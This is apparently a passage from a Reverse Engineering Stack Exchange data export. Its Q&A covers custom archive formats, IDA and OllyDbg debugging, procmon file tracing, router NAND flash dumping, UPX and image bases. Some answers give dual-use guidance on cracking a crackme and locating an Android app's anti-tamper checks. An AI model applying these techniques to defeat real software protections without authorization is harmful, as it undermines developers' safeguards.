<p>I've tried Dragon Unpacker, which can unpack <code>.big</code> files. But it seems, that they aren't valid <code>.big</code> files, just some kind of custom archive, which is named <code>.big</code>, so it seems, I have to write my own unpacker.</p>

<p>The archive was created in 1999. As far as I know, it contains mostly graphic and sound files.</p>

<p><code>data00.big</code> opened in hexeditor:</p>

<p><a href=""https://i.stack.imgur.com/RqJq8.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/RqJq8.png"" alt=""hex""></a></p>
","<p>I see filenames. That is an extremely important starting point - if I did not, I'd have to assume the file is encrypted, compressed, or does not use filenames at all, which are all harder to unpack.</p>

<p>For the moment, skip the header ""BigFile"" and the immedtaly following data and concentrate on these filenames alone.</p>

<p>If the filenames have different lengths, you can verify if these are records of a fixed length (where the filenames are padded), or have different lengths, in which case there may be a ""length"" value - or not. A length value may not be necessary, the file names can be terminated by a special value such as <code>0</code>.</p>

<p>There are other values too - usually, in an archive format, these are file lengths. There can also be a file <em>offset</em> - but from where? (E,g., start of file, start of archive data excluding the header, start of actual data, and so on.) A per-file offset is not required if all files appear end to end, then the lengths are enough.</p>

<p>There may be additional information per file record; I have encountered flags, file type codes, date/time stamps, checksums, and more. Usually, after you found out what the most important bits mean, the remaining data makes sense as well.</p>

<p>To find out what byte means what, write a small program to print out each file name and all of its associated data, up to the next file entry. Don't bother with trying to get a correct 'file count' yet. Most likely this is one of the numbers in the header at the start; you can go back to that when you got the file list details right. For starters, just write out the data of the first few dozen of entries.</p>

<p>Keep in mind that you cannot tell right away if extra data comes before or after the file name! Or even both.</p>

<p>File sizes and offsets are usually 4 byte numbers; the endianness can be trivially checked (all small numbers are good, all conspicuously large must be an error). Similar but varying numbers may be file sizes. A number that keeps increasing must be an absolute file offset. Numbers that always contain data in some binary positions and none in others can be flags of some kind. Large values, hovering around similar values, can very well be a time stamp. Finally, random looking full 4 byte numbers might be a checksum.</p>

<p>If you get consistent good results in decoding the data for the test set of file records, find the start and end of the list by trial and error. It's here that you may discover that the ""end"" of a record is actually the <em>start</em> of the next one.</p>

<p>This will tell you (1) the number of records, and (2) the start of the record data. You can inspect if these numbers appear in the ""BigFile"" header - particularly the number of records would be useful.</p>

<p>If you can locate numbers that ""look"" like they could be file lengths and (optionally) offsets, you can write a test program to extract a single file. This may also help with determining the order of data; if you extract a file that is clearly a PNG image but its associated filename is ""config.txt"", you have something in the wrong order.</p>

<p>An alternative to the above is focussing on the <em>data</em> first. Some file types, such as PNG images, should be entirely self containing: if you find the start of a PNG image, you can immediately extract it in its entirety by looking for the tell-tale <code>IEND</code> marker. Then you have a reliable file length and so you can search for a match in the file record set.</p>
","13127"
"When anaylsing a PE (.exe) in IDA Pro how can I jump to the 'user code' section and skip all the header/libary code?","771","","<p>Suppose I'm dissembling helloworld.exe (a program that outputs the string ""hello world"") and want to see the user code or code section for the file in IDA Pro. 
In what address would the user code be available? </p>

<p>When I mean user code I mean the .code section below</p>

<pre><code>HelloWorld db ""Hello, world!"",0
msgTitle db ""Hello world program"",0

.code
Start:
         push    offset msgTitle
         push    offset HelloWorld
         push    0
         call    MessageBoxA

         push 0
         call ExitProcess
ends
end Start
</code></pre>

<p>Bonus Question: When not using IDA Pro how can I determine the address of the user code of a Portable Executable?</p>
","<p>If You use IDA: When You open Your binary in IDA, navigate to drop-box in up-right corner and choose Entry points. You will see red point, which indicates the address of entry point:</p>

<p><a href=""https://i.stack.imgur.com/j7QUG.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/j7QUG.png"" alt=""enter image description here""></a></p>

<p>Without IDA: If You need to see Entry point of your binary without IDA, you need to parse PE and examine AddressOfEntryPoint value, which is RVA from base to the beginning of user-code [usually]</p>
","10693"
"Find messagebox string with ollydbg","768","","<p>For some reason i can't find any string matching the MessageBox text of a program when searching with ""search all reference strings"" , why is that?</p>
","<p>There are many, many <em>possible</em> reasons:</p>

<ul>
<li>the MessageBox text may be combined from several shorter snippets before being used</li>
<li>the text may be hidden in the resource part of the executable</li>
<li>the text may be loaded from a resource file at runtime, possibly depending on the language of the windows installation</li>
<li>the text may be in the executable file in an uncommon format; for example, if the software was written in chinese first, then translated to english, the strings may be in some UTF-16 or even UTF-32 format instead of the more common ASCII/UTF-8/ISO-8859-X formats</li>
<li>the application may be a client/server application, where the client retrieves the text from the server, and never stores/produces it itself</li>
<li>the text may have been deliberately obfuscated/encrypted in the executable file, to prevent people with ollydbg searching for it</li>
<li>and much more that doesn't come to mind right now.</li>
</ul>
","12441"
"What is the ""standard"" approach to find loop in binary code?","767","","<p>I am working on some x86 (32/64 bits) ELF binary code. These binaries are compiled from C and C++ program code and I am trying to detect loops inside the binaries. </p>

<p>I am newbie to this area, and I am wondering, what is the standard way to identify a loop in binary code? </p>

<p>I prefer to use some static methods to detect the loop instances, as I am not able to generate well-performing dynamic test cases.</p>
","<p>The classic, compiler theoretic answer to this question is to build a control flow graph and then do a graph analysis to identify natural loops. I believe algorithms for this can be found in the <a href=""http://rads.stackoverflow.com/amzn/click/0321486811"">Dragon Book</a>, and a summary is given in these slides:</p>

<p><a href=""http://www.cs.cmu.edu/afs/cs/academic/class/15745-s03/public/lectures/L7_handouts.pdf"">http://www.cs.cmu.edu/afs/cs/academic/class/15745-s03/public/lectures/L7_handouts.pdf</a></p>

<p>You can also see how LLVM implements its loop detection:</p>

<p><a href=""http://llvm.org/docs/doxygen/html/LoopInfo_8h_source.html"">http://llvm.org/docs/doxygen/html/LoopInfo_8h_source.html</a></p>

<p>The search terms you want to find more information are things like ""natural loop"" and ""back edge"".</p>
","12106"
"Complications reverse engineering a Visual Basic application","766","","<p>I'm reverse engineering a Visual Basic application and I've run into a big of a sticky situation, so I was hoping that someone might have an opinion on a way to approach it. It's basically a crackme but I haven't been able to nail down where the callback code is for the function I'm looking for. I've found the labels and captions but I was hoping for an intelligent way to start looking at the binary instead of crawling through it from top to bottom until I find the right comparison.</p>

<p>I've taken a look at the output of VB Decompiler but the output isn't matching up to what I'm used to.</p>

<p><img src=""https://i31.photobucket.com/albums/c367/Fewmitz/decomp_zpsc874945f.png"" alt=""here&#39;s the output from VB Decompiler""></p>

<p>In other VB apps it seems like the locations given there is enough to get started and find the callbacks, but not with this one: <img src=""https://i31.photobucket.com/albums/c367/Fewmitz/nocodes_zpsc79f980d.png"" alt=""this is what I get when trying to find any of the actual code"">. </p>

<p>I thought at first the code was just being rendered poorly in the debugger but after playing around with it I don't think that location is correct at all. So I'm looking for ideas on where to go from here.</p>

<p>Thanks.</p>
","<p>This is probably P-code compiled file, not native code. Try WKT Debugger:</p>

<p><a href=""http://www.woodmann.com/collaborative/tools/index.php/Whiskey_Kon_Tequilla_VB_P-Code_Debugger"" rel=""nofollow"">http://www.woodmann.com/collaborative/tools/index.php/Whiskey_Kon_Tequilla_VB_P-Code_Debugger</a></p>
","2667"
"OllyDbg Break when memory equals value","766","","<p>I'm wanting to have olly run a program and break when a particular memory location equals a given value. For instance, if I could have it run until the value at address 0xFB2D0024 == 0xE9, and then break immediately when that assignment occurs. Please let me know if this is possible!</p>

<p>The ""conditional"" breaks I found in <a href=""https://reverseengineering.stackexchange.com/questions/2763/how-to-set-a-conditional-breakpoint-on-specific-register-value-in-ollydbg"">here</a> did not work, or rather when I right clicked -> breakpoint -> Conditional, and then entered a condition, the program simply broke at the instruction where I right-clicked, regardless of the condition, and not when the condition occurred.</p>

<p>The closest I can get is right clicking on a particular memory value (in the memory dump) -> breakpoint -> Memory, on write, but this breaks every time a change is made, and not when a specific value is set. Any help would be great! Thanks!</p>
","<p>You can write script for ODbgScript plugin,</p>

<p>It might look like this: </p>

<pre><code>VAR pDest
VAR Val

mov pDest, FB2D0024 // dest address
mov Val, E9 // val to look for

bpwm pDest, 4 // set bp on writing DWORD (4bytes) value.
__lbl_loop:
erun
cmp [pDest], Val
jne __lbl_loop
bpmc
LOG ""Catched ^(._.^)""
</code></pre>
","4347"
"Breakpoint on io file read","764","","<p>I am investigating an application, which is encrypting it's files and stores them into disk. Of course i know where the files are and their corresponding filenames.</p>

<p>In order to find out how the decryption takes place i need to somehow break the execution on the opening of the file from the disk.</p>

<p>Has anybody any idea if something like this is possible?</p>

<p>The main problem that i have is that i am completely unable to detect how the application reads the file from disk. How am i supposed to find the module that is being called?</p>

<p>The application is a 64bit one and i am using Cheat Engine to debug it. I tried other 64bit debuggers as well, but none of them matched the memory search that is possible with CE.</p>

<p>PS: I've also posted this question in Stackoverflow, but i guess this is the best place to ask this question.</p>
","<p>use procmon from Sys Internals  to log the process<br>
filter the log for file access<br>
(latest release has a file summary tab that simplifies entering filter expressions to mere mouse clicks)</p>

<p>code for a simple xorrer  (takes an input file and writes back a xorred file)</p>

<pre><code>#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#define ENOENT 2
void main(int argc, char *argv[]) {
  if(argc !=3 ) { printf(""usage : %s infile outfile"",argv[0]); return;}
  FILE *fp = 0; errno_t err=ENOENT; long flen =0,bread =0 ; char *buff =0;
  if (((err = fopen_s(&amp;fp,argv[1],""rb"")) == 0) &amp;&amp; (fp !=0)) {
    fseek(fp,0,SEEK_END);
    flen = ftell(fp);
    if((buff = (char *)calloc(flen,sizeof(char))) !=0 ) {
      fseek(fp,0,SEEK_SET);
      if (( bread = fread(buff,sizeof(char),flen,fp) ) == flen) {
        fclose(fp); err=ENOENT;
        for(int i = 0; i&lt; flen; i++)  {
          buff[i] ^= 'A' ;
        }
        if(((err = fopen_s(&amp;fp,argv[2],""wb"")) == 0) &amp;&amp; (fp !=0)) {
          fwrite(buff,1,flen,fp);
          fclose(fp);
          free(buff);
        }
      }
    }
  }
}
</code></pre>

<p>a batfile logging this file access (blind run) and loading the log into procmon again for applying filters and saving back the filtered events as xml
which allows powershell to parse and print </p>

<pre><code>echo off
start procmon.exe /quiet  /minimized /backingfile /nofilter .\LogFile.pml
procmon.exe /waitforidle
start /wait encfile.exe rawdata.txt encdata.txt
procmon.exe /terminate
start /wait procmon.exe /openlog .\logfile.pml
powershell  ([xml] ( Get-Content .\logfile.xml)).procmon.eventlist.event[2].stack.frame 
pause
</code></pre>

<p>filter used to save xml file was ""Include if path contains xxxx where xxxx is the filename of interest""</p>

<p>here is the stack of the fileRead </p>

<pre><code>PS &gt; ([xml]
 ( Get-Content .\logfile.xml)).procmon.eventlist.event[2].stack.frame

depth               address             path                location
-----               -------             ----                --------
0                   0xb9ed5888          C:\WINDOWS\Syste... FltpPerformPreCa...
1                   0xb9ed72a0          C:\WINDOWS\Syste... FltpPassThroughI...
2                   0xb9ed7c48          C:\WINDOWS\Syste... FltpPassThrough ...
3                   0xb9ed8059          C:\WINDOWS\Syste... FltpDispatch + 0...
4                   0x804ee129          C:\WINDOWS\syste... IopfCallDriver +...
5                   0x80571d9c          C:\WINDOWS\syste... NtReadFile + 0x580
6                   0x8053d658          C:\WINDOWS\syste... KiFastCallEntry ...
7                   0x40364c            C:\Documents and... encfile.exe + 0x...
8                   0x403ac0            C:\Documents and... encfile.exe + 0x...
9                   0x4033a2            C:\Documents and... encfile.exe + 0x...
10                  0x4015bf            C:\Documents and... encfile.exe + 0x...
11                  0x401698            C:\Documents and... encfile.exe + 0x...
12                  0x4016d1            C:\Documents and... encfile.exe + 0x...
13                  0x4010d3            C:\Documents and... encfile.exe + 0x...
14                  0x401d09            C:\Documents and... encfile.exe + 0x...
15                  0x7c817077          C:\WINDOWS\syste... BaseProcessStart...
16                  0x0
</code></pre>

<p>ascertaining  the ReadFile  call</p>

<pre><code>:\cdb -c ""ub 40364c;q"" encfile.exe | tail -n 2
00403646 ff1550b04000    call    dword ptr [image00400000+0xb050 (0040b050)]
quit:

:\cdb -c "".printf \""%y\n\"",poi(40b050);q"" encfile.exe | tail -n 2
kernel32!ReadFile (7c801812)
quit:
</code></pre>
","9196"
"How to monitor calls to an external library function?","761","","<p>I have an application which is executing oci statements using OCIStmtExecute(). I need to know which sql statement is being passed to OCIStmtPrepare on what action. Tried using API Monitor but there weren't OCI.dll functions. Also placing a breakpoint doesn't help since it's executing a notify statement almost every half a second.</p>
","<blockquote>
  <p>Tried using API Monitor but there weren't OCI.dll functions.</p>
</blockquote>

<p>OCI.dll most certainly does export functions, including <code>OCIStmtExecute()</code> and <code>OCIStmtPrepare()</code>:</p>

<p><a href=""https://i.imgur.com/hDqGtL8.png"" rel=""nofollow noreferrer""><img src=""https://i.imgur.com/hDqGtL8.png"" alt=""OCIStmtExecute""></a></p>

<p>If you're not seeing them in API Monitor, it's because you've not told API Monitor to log them correctly, or because they're not really being called by the target process.</p>
","10779"
"How to go back to main thread?","760","","<p>I was analyzing a sample and the function <code>CreateRemoteThread</code> is called with <code>dwCreationFlag = 0</code>, so the created thread starts immediately after creation.
OllyDbg jumps to beginning of the new thread. I analyze the new thread and at the end of that, it calls <code>RtlExitUserThread</code> and the thread is terminated.</p>

<p>To visualize, you can consider the following:</p>

<pre><code>  PUSH EAX                              ; dwCreationFlag = 0
     .
     .
     .
  CALL DWORD PTR SS:[EBP-28]           ; CreateRemoteThread
     .
  (lines which I would also like to analyze)
</code></pre>

<p>As I described, the new thread starts and it ends with a call to <code>RtlExitUserThread</code> but I would like to analyze the lines after the call to <code>RtlExitUserThread</code>.</p>

<p>How can I go back to the main thread, because there was a lot of lines to analyze (after the call to <code>CreateRemoteThread</code>)?</p>
","<p>Right Click within the Disassembler window -> <em>Select thread</em> -> Click <em>Main thread</em></p>

<p>Here is an image for reference.
<img src=""https://i.stack.imgur.com/X6ANZ.png"" alt=""enter image description here""></p>
","8918"
"Anti-tampering techniques in Android APK's","759","","<p>I'm reverse engineering an Android app, and it has some kind of anti-tamper protection. The problem is that I can't find it anywhere in the smali files.</p>

<p>Even if I just re-sign the official APK that I downloaded straight from the Play Store, it detects that it has been tampered with, so it must either be checking file sizes or signatures. I've grepped all the smali files for things like ""signature"" and ""getPackageInfo"" to try and find where it's getting the signature from, but I cannot find anything.</p>

<p>What other methods are there to figure out if the APK has been re-signed, even when nothing else has been altered? It is not using SafetyNet.</p>
","<p>Your best bet is to just start reading through the code and see everything it does. It almost certainly is checking signatures, just in a way that your search missed. That could be because it is using an API you didn't search for, or because the code is obfuscated, or because you messed up the search. Note that there are a lot of APIs that could be used to get information about the app. For example, it could be using the JarFile getResource() API. The most reliable method is to just read the code.</p>

<p>Also don't forget to look in the native code, if any! You can check whether the app is using native code by looking in the libs folder. This is a bit of a longshot though, since most programmers are too lazy to write native code. If they are doing the checks in native code, it's probably an off the shelf packer/obfuscator.</p>

<p>For completeness, I should mention that there are several features of an app that depend on its signature. For example, it could be using a signature based permission or a shared userid, each of which would break if you resigned the app. I've never heard of these being used for tamper detection though.</p>
","15395"
"How to edit (insert new fields into) IDA structures?","759","","<p>I'm trying to reverse a bigger structure used in an old game. Obviously I didn't know all fields when I created the structure type, and now I want to edit in some new fields / change pure byte gaps into meaningful fields.</p>

<p>This, for example, is a structure of a GuiButton which I know by now, but it's just a gap yet:
<a href=""https://i.stack.imgur.com/WGjt7.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/WGjt7.png"" alt=""enter image description here""></a></p>

<p>I don't find any way to edit the field of the structure. Do I have to completely delete the existing structure and create a new one?
<a href=""https://i.stack.imgur.com/8kQLb.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/8kQLb.png"" alt=""enter image description here""></a></p>
","<p>You can undefine the field (select <strong>Undefine</strong> from the context menu or press <kbd>U</kbd>) and then press <kbd>D</kbd> to define a new field in the gap.</p>
","12589"
"Kernel debugging between two virtual machines not working","756","","<p>i want to do kernel debugging on my vm from another vm.</p>

<p>My setup is pretty simple,</p>

<p><strong>Debugged - VM</strong>:
Windows XP SP3 x32 (To be debugged)</p>

<p><strong>Debugger - VM</strong>: 
Windows 7 SP1 x64 (With Windbg installed - the Debugger)</p>

<p>the pipe configuration is pretty simple as well..
both ends should be set as <code>The other end is a virtual machine</code>, and on the XP VM i set the pipe as <code>This end is the server</code> and on the Win7 vm i set <code>This end is the client</code>. Im using <strong>Vmware Workstation 10.0.3</strong> btw..</p>

<p>I know i did setup my XP vm correctly because i can debug it from the host easily - configuring <code>The other end is an application</code> and connecting it with Windbg from my host computer (Win7 x64) and its working properly. So i know there is no problem with my Win-XP setup</p>

<p>But doing the same thing from the other vm, nothing happens. I looked through the internet and i even followed tutorials that explained exactly what i already did.
I have no idea what i'm missing and i feel pretty helpless so i came asking here.</p>

<p>Anyone got any ideas what is the problem with my setup?</p>
","<p>Fixed the problem.. 
On the windbg client, uncheck the 'Reconnect' and 'Pipe' checkboxes on the COM tab - then it will connect to the debugger.</p>
","11382"
"Corpus Distillation","755","","<p>Anyone know of any tools or scripts that can help in <a href=""http://googleonlinesecurity.blogspot.de/2011/08/fuzzing-at-scale.html"" rel=""nofollow"">corpus distillation</a> ? I know of <a href=""http://old.peachfuzzer.com/v3/minset.html"" rel=""nofollow"">Peach Minset</a>, but not other than that. Appreciate if anyone could share.</p>
","<p>Some time ago I wrote <a href=""https://github.com/ea/minblox"" rel=""nofollow"">minblox</a> for that exact purpose. It relies on DynamoRIO. Compared to minset which uses pin tool, there isn't much of a difference. Tho I think actual set minimization part works faster than minset. </p>

<p>Minblox tool is comprised of two parts.</p>

<ul>
<li>A DynamoRIO instrumentation part (libbbcoverage) tasked with recording all basic block executed during application execution.</li>
<li>minblox.py - Python script that runs the DynamoRIO instrumentation and analyzes the log files to minimize the sample set.</li>
</ul>

<p>Though, do bear in mind that I've only tested this for a specific case I needed it, so your mileage might vary. </p>
","4577"
"How to find a symbol in a binary using radare2?","752","","<p>I want to find an address of a symbol (e.g <code>strcpy</code>) inside a binary using radare2. I tried to use the <code>f</code> command to list all flags which are recognized by r2 but the list is enormous and it's not comfortable to find the address of a specific symbol that way.  </p>

<p>What is the best way, if there's any, to do so.</p>
","<p>The <code>f</code> command is used to list all the flags from the selected flagspace. By default all the available flagspaces are selected. In order to select the 'symbols' flagspace and list only the flags inside it, use:</p>

<pre><code>[0x004049a0]&gt; fs symbols
[0x004049a0]&gt; f
0x00402a00 261 main
0x004049a0 41 entry0
0x0061e600 8 obj.__bss_start
0x00413c8c 9 sym._fini
0x0061e610 4 obj.optind
0x004022b8 26 sym._init
0x0061e620 8 obj.program_invocation_name
0x0061e600 0 loc.__bss_start
0x0061f368 0 loc._end
0x00412960 38 sym._obstack_memory_used
0x0061e5f8 8 obj.obstack_alloc_failed_handler
0x00412780 17 sym._obstack_begin
0x0061e640 8 obj.stderr
0x004128f0 106 sym._obstack_free
0x004128c0 48 sym._obstack_allocated_p
0x0061e618 8 obj.optarg
0x004127a0 21 sym._obstack_begin_1
0x004127c0 245 sym._obstack_newchunk
0x0061e608 8 obj.stdout
</code></pre>

<p>However, my preferred way to list all the symbols is to use the <code>i</code> command which actually uses 'rabin2' (<code>man rabin2</code>) to retrieve information about the binary. Use <code>i?</code> to get help about the command.</p>

<p>In order to list all the symbols run <code>is</code>.
If you want to ""grep"" for a specific symbol use radare's internal grep <code>~</code>:</p>

<pre><code>[0x004049a0]&gt; is~strcpy
vaddr=0x004023c0 paddr=0x000023c0 ord=013 fwd=NONE sz=16 bind=GLOBAL type=FUNC name=imp.strcpy
</code></pre>

<p>And if you want only the address, use:</p>

<pre><code>[0x004049a0]&gt; is~strcpy[1]
0x004023c0
</code></pre>

<p>More information about flags and flagspaces can be found <a href=""https://radare.gitbooks.io/radare2book/content/basic_commands/flags.html"" rel=""noreferrer"">here</a><br>
More information about symbols can be found <a href=""https://radare.gitbooks.io/radare2book/content/rabin2/symbols.html"" rel=""noreferrer"">here</a></p>
","15646"
"Technicolor TG799vac Modem/Router Dumping The Nand Flash","749","","<p>Ok, so I have been trying to dump the contents of a Technicolor TG799vac.</p>

<p>So far I have removed the flash chip and read out the chip using the DumpFlash.py utility
and used binwalk to locate the Squashfs File system </p>

<pre><code>DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
39436         0x9A0C          SHA256 hash constants, big endian
31764480      0x1E4B000       JFFS2 filesystem, big endian
32013764      0x1E87DC4       JFFS2 filesystem, big endian
32242272      0x1EBFA60       JFFS2 filesystem, big endian
36765696      0x2310000       Squashfs filesystem, little endian, version 4.0, compression:xz, size: 14928222 bytes, 3253 inodes, blocksize: 262144 bytes, created: 2016-06-28 03:08:22
51709334      0x3150596       xz compressed data
51855814      0x31741C6       xz compressed data
51922474      0x318462A       xz compressed data
52004354      0x3198602       xz compressed data
52046150      0x31A2946       xz compressed data
52047662      0x31A2F2E       xz compressed data
52091472      0x31ADA50       xz compressed data
52093306      0x31AE17A       xz compressed data
52095388      0x31AE99C       xz compressed data
52097286      0x31AF106       xz compressed data
52099504      0x31AF9B0       xz compressed data
52101750      0x31B0276       xz compressed data
52103748      0x31B0A44       xz compressed data
52106574      0x31B154E       xz compressed data
52108628      0x31B1D54       xz compressed data
52110506      0x31B24AA       xz compressed data
52112416      0x31B2C20       xz compressed data
52114650      0x31B34DA       xz compressed data
52116652      0x31B3CAC       xz compressed data
52118514      0x31B43F2       xz compressed data
52118772      0x31B44F4       xz compressed data
52122718      0x31B545E       xz compressed data
52126772      0x31B6434       xz compressed data
52131218      0x31B7592       xz compressed data
52135620      0x31B86C4       xz compressed data
52138550      0x31B9236       xz compressed data
52141480      0x31B9DA8       xz compressed data
52144930      0x31BAB22       xz compressed data
52148772      0x31BBA24       xz compressed data
52152506      0x31BC8BA       xz compressed data
52153220      0x31BCB84       xz compressed data
52153882      0x31BCE1A       xz compressed data
52155856      0x31BD5D0       xz compressed data
52157758      0x31BDD3E       xz compressed data
52159824      0x31BE550       xz compressed data
137234956     0x82E0A0C       SHA256 hash constants, big endian
</code></pre>

<p>I used <code>dd</code> to extract the Image: </p>

<pre><code>$ dd  if=Modem.img bs=1 skip=36765696 count=14928222 of=Modem.squashfs
14928222+0 records in
14928222+0 records out
14928222 bytes (15 MB) copied, 22.0777 s, 676 kB/s
</code></pre>

<p>I tried to <code>unsuqashfs</code> the image:</p>

<pre><code>$ unsquashfs -s Modem.squashfs
Found a valid SQUASHFS 4:0 superblock on Modem.squashfs.
Creation or last append time Tue Jun 28 13:08:22 2016
Filesystem size 14578.34 Kbytes (14.2 Mbytes)
Compression xz
xz: error reading stored compressor options from filesystem! 
Block size 262144 
Filesystem is exportable via NFS                                                                           Inodes are compressed
Data is compressed                                                                    Fragments are compressed                                                                  Always-use-fragments option is not specified                                                                     Xattrs are not stored                                                                        Duplicates are Removed                                                                       Number of fragments 85                                                                            Number of inodes 3253                                                                         Number of ids 1

$ unsquashfs -d squash-root1  Modem.squashfs
Parallel unsquashfs: Using 4 processors
Lseek failed because Invalid argument
read_block: failed to read block @0x71eed2525ee8f30e
read_uids_guids: failed to read id table block
FATAL ERROR:failed to uid/gid table
</code></pre>

<p>But, it failed. So, I tried to extract with <code>firmware-mod-kit</code>:</p>

<pre><code>$ ./unsquashfs_all.sh ~/projects/Telstra/DumpFlash/Modem.squashfs ~/projects/Telstra/DumpFlash/Squashfs/

Attempting to extract SquashFS .X file system...

Trying ./src/squashfs-2.1-r2/unsquashfs-lzma... 
Trying ./src/squashfs-2.1-r2/unsquashfs... 
Trying ./src/squashfs-3.0/unsquashfs-lzma... 
Trying ./src/squashfs-3.0/unsquashfs... 
Trying ./src/squashfs-3.0-lzma-damn-small-variant/unsquashfs-lzma... 
Trying ./src/others/squashfs-2.0-nb4/unsquashfs... 
Trying ./src/others/squashfs-3.0-e2100/unsquashfs-lzma... 
Trying ./src/others/squashfs-3.0-e2100/unsquashfs... 
Trying ./src/others/squashfs-3.2-r2/unsquashfs... 
Trying ./src/others/squashfs-3.2-r2-lzma/squashfs3.2-r2/squashfs-tools/unsquashfs... 
Trying ./src/others/squashfs-3.2-r2-hg612-lzma/unsquashfs... 
Trying ./src/others/squashfs-3.2-r2-wnr1000/unsquashfs... 
Trying ./src/others/squashfs-3.2-r2-rtn12/unsquashfs... 
Trying ./src/others/squashfs-3.3/unsquashfs... 
Trying ./src/others/squashfs-3.3-lzma/squashfs3.3/squashfs-tools/unsquashfs... 
Trying ./src/others/squashfs-3.3-grml-lzma/squashfs3.3/squashfs-tools/unsquashfs... 
Trying ./src/others/squashfs-3.4-cisco/unsquashfs... 
Trying ./src/others/squashfs-3.4-nb4/unsquashfs-lzma... 
Trying ./src/others/squashfs-3.4-nb4/unsquashfs... 
Trying ./src/others/squashfs-4.2-official/unsquashfs... Parallel unsquashfs: Using 4 processors
Trying ./src/others/squashfs-4.2/unsquashfs... Parallel unsquashfs: Using 4 processors
Trying ./src/others/squashfs-4.0-lzma/unsquashfs-lzma... Parallel unsquashfs: Using 4 processors
Trying ./src/others/squashfs-4.0-realtek/unsquashfs... Skipping others/squashfs-hg55x-bin (wrong version)...
File extraction failed!
</code></pre>

<p>I also tried <code>sasquatch</code>:</p>

<pre><code>$ sasquatch  -trace Modem.squashfs 
squashfs: read_bytes: reading from position 0x0, bytes 32
SquashFS version [4.0] / inode count [3253] suggests a SquashFS image of the same endianess
squashfs: read_bytes: reading from position 0x0, bytes 96
squashfs: read_bytes: reading from position 0x60, bytes 2
squashfs: read_block: block @0x60, 12 uncompressed bytes
squashfs: read_bytes: reading from position 0x62, bytes 12
Parallel unsquashfs: Using 1 processor
squashfs: read_uids_guids: no_ids 1
squashfs: read_bytes: reading from position 0xe3c956, bytes 8
squashfs: read_bytes: reading from position 0x71eed2525ee8f30e, bytes 2
Lseek failed because Invalid argument
read_block: failed to read block @0x71eed2525ee8f30e
read_uids_guids: failed to read id table block
FATAL ERROR:failed to uid/gid table
</code></pre>

<p>But still no joy. :-(</p>

<p>Can anyone offer any advice or maybe point out any mistakes as I am new to this all and still learning any tips or pointers would be a great help.</p>
","<p>Ok I managed to get it to extract.... Yay</p>

<p>As it turns out when I did the NAND dump I also dumped the OOB part of the NAND.<br>
So I had to run it through Jean-Michel Picod's <code>Nand-dump-tool.py</code> program to separate out the OOB area.</p>

<pre><code>$ python Nand-dump-tool.py  -i ModemRaw.img -o Split_seperate.img -I
01f1801d  --layout separate

[*] Using given ID code ID code  : 01f1801d
Manufacturer                     : AMD / Spansion
Device                           : NAND 128MiB 3,3V 8-bit
Die/Package                      : 1
Cell type                        : 2 Level Cell
Simultaneously programmed paged  : 1
Interleave between multiple chips: False
Write cache                      : True
Page size                        : 2048 bytes (2 K)
Spare area size                  : 16 bytes / 512 byte
Block size                       : 131072 bytes (128 K)
Organization                     : X16
Serial access time               : 29 ns
OOB size                         : 64 bytes

[*] Start dumping...
[*] Finished

Total: 138412032 bytes (132.00 MB)
Data : 134217728 bytes (128.00 MB)
OOB  : 4194304 bytes (4.00 MB)
Clear: 86.69% of the flash is empty (56813 pages out of 65536)
</code></pre>

<p>Once that was done running it through binwalk again gave me a much more sensible output and a extracted File System... </p>
","13602"
"What different UPX formats exist and how do they differ?","748","","<p>Recently I asked a <a href=""https://reverseengineering.stackexchange.com/q/168/214""> question about detecting UPX compression</a>. <a href=""https://reverseengineering.stackexchange.com/users/245/0xc0000022l"">0xC0000022L</a> wanted to know if it was plain UPX. However until that point I only was aware of <a href=""http://upx.sourceforge.net/"" rel=""nofollow noreferrer"">plain UPX</a>. So my question is:</p>

<ul>
<li>What versions/modifications of UPX exist?</li>
<li>How do they differ? What features do they have?</li>
</ul>
","<p>I will ignore that there's multiple compression algorithms in UPX and that there's been multiple versions of UPX. </p>

<p>Generally when people ask if it's plain or vanilla UPX it's because malware and other software likes to take UPX and modify it slightly so that it can't be unpacked with the standard UPX executable and so that anti viruses will have a harder time unpacking it. It's not very effective at counteracting reverse engineering.</p>
","203"
"Dumping Flash Memory Using Bus Pirate","747","","<p>I'm planning on dumping and reading the flash memory of a Winbond W25Q128FV chip. I've done some research and plan on buying the following tools to achieve this:</p>

<ul>
<li>Bus Pirate 3.6a</li>
<li><a href=""http://rads.stackoverflow.com/amzn/click/B01CRCSO2O"" rel=""nofollow noreferrer"">Probe Cable</a></li>
<li><a href=""http://rads.stackoverflow.com/amzn/click/B01KLT04PA"" rel=""nofollow noreferrer"">SOIC8 Test Clip</a></li>
</ul>

<p>I already have a soldering kit. Are these the right tools and are they sufficient to read the flash memory to my computer?</p>

<p>Also, I already have an Arduino Uno and a Raspberry Pi. Can either of those be used in place of a Bus Pirate?</p>
","<p>Sounds like you're good to go. Yes the Raspberry has a SPI interface so you can connect the Winbond to it and use the ""flashrom"" to dump it. Attach the SOIC clip to the chip and connect the pins to the Raspberry Pi respective pins:
MISO
MOSI
Chip Select
Clock
Ground
Also the appropriate voltage Vcc 3.3 or 5. Pi can provide both .</p>
","14541"
"IDAPython script does not reload","747","","<p>I'm debugging an IDAPython script on my host machine and I have IDA running on my Windows VM. The folder containing the IDAPython script on the host machine is shared with the VM.</p>

<p>The first time I run the IDAPython script in IDA it works fine. However, for subsequent runs a cached version of the script seems to be running. I end up having to close and re-start IDA in order for the changes to get loaded up. Is there an easier way? I run scripts as <code>File &gt; Open Script file.</code></p>
","<p>You can use <code>idaapi.require(""module_name"")</code> to reload the script.
There is more information about it the HexBlog article, <a href=""http://www.hexblog.com/?p=749"" rel=""nofollow""><em>Loading your own modules from your IDAPython scripts with idaapi.require()</em></a>.</p>
","8061"
"Image base of unknown file format?","747","","<p>As a beginner I'm trying to load an unknown format binary file with IDA Pro,but I don't know the Image Base of this file. Are there any methods to get the Image Base. Could you also reference related papers in your answer. </p>
","<p>One possible method is if there are string tables present, and pointer tables to those strings, is load the bin into IDA at zero and find the strings, then write a program to search the binary looking for int32 differences that matched the differences in the start of each string.</p>

<p>I searched for byte/word/int's in big/little endian formats, and once you find the match, then you can calc the correct base from the difference from you search address and the resulting address/pointer table.</p>

<p>Here's the C# code I used</p>

<pre><code>static void SearchDumpsForIntDiff(string filename, params int[] dcode)
